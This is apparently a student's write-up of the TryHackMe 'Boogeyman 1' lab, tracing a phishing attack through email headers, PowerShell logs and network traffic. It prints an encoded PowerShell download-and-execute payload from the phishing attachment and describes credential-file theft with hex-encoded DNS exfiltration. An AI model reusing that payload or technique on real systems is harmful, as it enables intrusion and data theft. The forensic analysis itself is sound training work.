# 🛡️ Boogeyman 1 - Full Attack Chain Investigation: TryHackMe Lab

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Type-Incident%20Response-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Role-SOC%20Analyst%20Tier%201-blue?style=for-the-badge"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bginicio.jpg" width="700"/>
</p>

**Room link:** [tryhackme.com/room/boogeyman1](https://tryhackme.com/room/boogeyman1)

This room is one of the **SOC Level 1 Capstone Challenges**, meaning it's designed to pull together everything from earlier in the path (phishing analysis, Windows logs, Wireshark) into one full investigation.

---

## 📌 About This Lab

Julianne, a finance employee at Quick Logistics LLC, opened an invoice attachment from what looked like a real business partner. It wasn't. A new threat group calling itself "Boogeyman" is behind it, and the job is to trace the entire attack from that first email all the way to what data actually got stolen. Three artefacts are provided: the phishing email itself, PowerShell logs from Julianne's machine, and a packet capture of the network traffic.

**Tools used:** Thunderbird, LNKParse3, Wireshark, Tshark, jq, CyberChef, plus command-line basics (grep, sed, awk, base64)

**Objectives:**
- Analyse email headers and a malicious attachment to trace initial access
- Parse PowerShell logs to see what the attacker did once inside
- Follow network traffic to confirm what data was exfiltrated and how

---

## 🔍 Investigation

### Part 1: Email Analysis

**Q: What is the email address used to send the phishing email? What is the victim's email address?**

**Method:** Opened `dump.eml` in Thunderbird to read the headers directly.

> **Answer:** Sender: `agriffin@bpakcaging.xyz`, victim: `julianne.westcott@hotmail.com`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg1.jpg" width="700"/>
</p>

**Q: What third-party mail relay service did the attacker use, based on the DKIM-Signature and List-Unsubscribe headers?**

**Method:** Opened the email's raw source view and searched for "DKIM-Signature" directly.

> **Answer:** `elasticemail`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg2.jpg" width="700"/>
</p>

**Q: What is the name of the file inside the encrypted attachment? What is the password?**

**Method:** The password was written in the body of the phishing email itself.

> **Answer:** File: `Invoice_20230103.lnk`, password: `Invoice2023!`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg3.jpg" width="700"/>
</p>

**Q: Based on the LNKParse3 result, what is the encoded payload found in the Command Line Arguments field?**

**Method:** Ran `lnkparse` on the extracted `.lnk` file, as suggested by the room, and read the Command Line Arguments field.

> **Answer:** `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg4.jpg" width="700"/>
</p>

---

### Part 2: Endpoint Security (PowerShell Logs)

**Q: What domains did the attacker use for file hosting and C2?**

**Method:** I wasn't sure how to build this `jq` filter on my own, so I asked Google AI for help. It suggested navigating to the artefacts folder and running `cat powershell.json | jq -r '.ScriptBlockText' | grep -oE '[a-zA-Z0-9.-]+\.bpakcaging\.xyz' | sort -u | paste -sd, -`.

> **Answer:** `cdn.bpakcaging.xyz, files.bpakcaging.xyz`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg5.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg6.jpg" width="700"/>
</p>

**Q: What is the name of the enumeration tool downloaded by the attacker?**

**Method:** Again asked Google AI for a filtering command, it recommended `cat powershell.json | jq -r '.ScriptBlockText' | grep -oE '[a-zA-Z0-9_\.-]+\.[a-zA-Z0-9]{2,4}' | sort -u`.

> **Answer:** `Seatbelt`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg7.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg8.jpg" width="700"/>
</p>

**Q: What file did the attacker access using the downloaded sq3.exe binary? Provide the full file path.**

**Method:** Searched the PowerShell logs for `sq3.exe` execution with `cat powershell.json | jq '{EventID, ScriptBlockText}' | grep sq3.exe`, then figured out the username with a similar search filtered on `Users`.

> **Answer:** `C:\Users\julianne.westcott\AppData\Roaming\Microsoft\Sticky Notes\LocalState\plum.sqlite`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg9.jpg" width="700"/>
</p>

**Q: What software uses that file? What is the name of the exfiltrated file?**

> **Answer:** `Microsoft Sticky Notes`, exfiltrated file: `protected_data.kdbx`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg10.jpg" width="700"/>
</p>

**Q: What type of file uses the .kdbx extension?**

**Method:** Didn't know this one, searched it on Google.

> **Answer:** `KeePass`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg11.jpg" width="700"/>
</p>

**Q: What encoding was used during the exfiltration? What tool was used?**

**Method:** I got stuck here and couldn't find the right command on my own. Eventually found one that worked: `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort -u`.

> **Answer:** Encoding: `hex`, tool: `nslookup`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg12.jpg" width="700"/>
</p>

---

### Part 3: Network Traffic Analysis

**Q: What software did the attacker use to host its file/payload server?**

**Method:** Filtered Wireshark by the known malicious domain (`http.host contains files.bpakcaging.xyz`), followed the HTTP stream, and read the server header directly.

> **Answer:** `python` (SimpleHTTP/0.6, Python 3.10.7)

**Q: What HTTP method does the C2 use to send back command output?**

> **Answer:** `POST`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg13.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg14.jpg" width="700"/>
</p>

**Q: What protocol was used during the exfiltration activity?**

**Method:** Searched this one on Google to confirm.

> **Answer:** `DNS`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg15.jpg" width="700"/>
</p>

**Q: What is the password of the exfiltrated file?**

**Method:** Went back to the `sq3.exe` finding from Part 2, searched HTTP traffic for it in Wireshark, followed the TCP stream, and found the next relevant one (stream 750). Copied the POST body into CyberChef and ran the Magic operation to decode it automatically.

> **Answer:** `%p9^3!lL^Mz47E2GaT^y`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg16-1.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg16-2.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg16-3.jpg" width="700"/>
</p>

**Q: What is the credit card number stored inside the exfiltrated file?**

**Method:** I was completely stuck on this one and couldn't figure out the extraction on my own. Watched a YouTube walkthrough, which used `tshark -r capture.pcapng -Y "ip.dst==167.71.211.113 and dns" -T fields -e dns.qry.name | grep -E '[A-F0-9]+\.bpakcaging\.xyz$' | cut -d'.' -f1 | tr -d '\n' | xxd -p -r > protected_data.kdbx` to rebuild the stolen file from the DNS queries used to smuggle it out, then opened it with the password found earlier.

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bg17.jpg" width="700"/>
</p>

---

## 🧠 What I Learned

- How to trace a full attack chain across an email, PowerShell logs, and a packet capture
- Recognizing DNS as an exfiltration channel, data can be hidden inside DNS queries that look like normal lookups
- That `.kdbx` is a KeePass password database file, a small but useful fact I didn't know before this room

---

## 💬 Honest Self-Assessment

**What I need to improve:**
This was the hardest room I've documented so far. I got stuck multiple times and had to lean on outside help, Google AI for building several `jq` commands, a plain Google search for facts I didn't know, and a YouTube walkthrough for the final question, which I genuinely couldn't work out on my own. I'm being upfront about that because I think it matters more to show how I actually got through a hard room than to pretend I solved every step independently.

---
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Boogeyman-1/Screenshots/bgfinal.jpg" width="700"/>
</p>

<p align="center">
  <i>"Stay sharp, stay curious, stay secure."</i> 🔐
</p>
<p align="center">Thank you for visiting! 🙏</p>
<p align="center">Made with 🛡️ by <a href="https://github.com/frankllin-sec">Frankllin</a></p>
